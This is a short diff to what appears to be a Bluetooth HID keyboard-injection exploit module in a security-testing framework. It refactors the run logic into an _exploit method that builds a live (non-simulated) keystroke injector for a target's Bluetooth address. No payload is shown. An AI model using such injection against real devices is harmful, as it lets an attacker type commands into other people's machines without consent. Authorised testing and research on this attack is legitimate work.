@@ -339,10 +339,15 @@ class Exploit(_BaseExploit):
             print_error("Set target_addr to the Bluetooth BD_ADDR of the target device.")
             return
         print_status(f"HID Keyboard Inject -> {addr}  payload: {self.payload!r}")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E BT HID keyboard injection via L2CAP raw sockets."""
+        addr = str(self.target_addr).strip()
         injector = BTHIDKeyboardInject(
             target_addr=addr,
             payload=str(self.payload),
-            hci_index=int(str(self.hci_iface).replace("hci","") or "0"),
+            hci_index=int(str(self.hci_iface).replace("hci", "") or "0"),
             simulate=False,
         )
         result = injector.run()
